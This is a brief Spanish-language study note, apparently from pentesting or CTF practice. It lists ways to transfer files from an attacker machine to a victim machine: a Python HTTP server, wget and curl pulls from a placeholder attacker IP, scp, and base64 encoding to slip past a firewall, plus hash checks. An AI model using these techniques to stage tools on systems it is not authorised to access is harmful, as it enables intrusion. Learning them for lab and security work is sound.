
---

Para transferir un archivo de una maquina atacante a una maquina victima existen multitud de posibilidades, en esta nota se mostraran las técnicas que vaya descubriendo:

- montando un servidor http con **python**

```bahs
python3 -m http.server <puerto donde lo queremos montar>
```

```bash 
wget <ip-maquina-atacante>:<puerto-atacante>/recursoADescargar(nombre con extension)
```

ACLARACION para facilitar la descarga montar el servidor python en la maquina atacante estando en el directorio que contiene el archivo que queremos traspasar 

También podemos usar llamadas curl para descargar nuestros archivos:
```bash
curl <ip-maquina-atacante>:<puerto-atacante>/recursoADescargar(nombre con extension) -o <nombre a guardar>
```

Método SCP que podemos usar si tenemos usuario de SSH
```bash
scp <nombre a guardar> <usuario>@<ipRemota>:<url archivo a descargar>
```

Método Base64, usado cuando existe algún tipo de firewall que nos impide la transferencia de archivos
```bash
base64 <nombre archivo> -w 0
```

Una vez encodeado el archivo podemos copiar el string resultante y transferirlo a la maquina victima, en ella utilizaremos los comandos para de codearlo 
```bash
echo <String en base64> | base64 -d > <nombre de output>
```

Podemos validar las transferencias de archivos usando el comando file para verificar el formato del archivo y con md5sum su hash
```bash
file <nombre archivo>
md5sum <nombre archivo> (esto se hace en la maquina local y en la remota, tienen que coincidir las sumas)
```